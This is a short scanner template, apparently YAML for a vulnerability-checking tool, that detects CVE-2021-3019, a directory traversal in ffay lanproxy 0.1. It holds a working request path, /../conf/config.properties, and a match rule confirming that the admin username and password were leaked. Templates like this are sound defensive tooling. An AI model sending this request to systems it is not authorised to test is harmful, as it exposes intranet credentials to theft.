id: CVE-2021-3019

info:
  name: Lanproxy Directory Traversal
  author: pa55w0rd
  severity: high
  verified: true
  description: |-
    ffay lanproxy 0.1 allows Directory Traversal to read /../conf/config.properties to obtain credentials for a connection to the intranet.
  reference:
    - https://www.tenable.com/security/research/tra-2021-23
    - https://nvd.nist.gov/vuln/detail/CVE-2021-3019
  tags: cve,cve2021,lanproxy,traversal
  created: 2023/06/23

rules:
  r0:
    request:
      method: GET
      path: /../conf/config.properties
    expression: response.status == 200 && response.body.bcontains(bytes(string(b"config.admin.username"))) && response.body.bcontains(bytes(string(b"config.admin.password"))) && response.content_type.contains("application/octet-stream")
expression: r0()
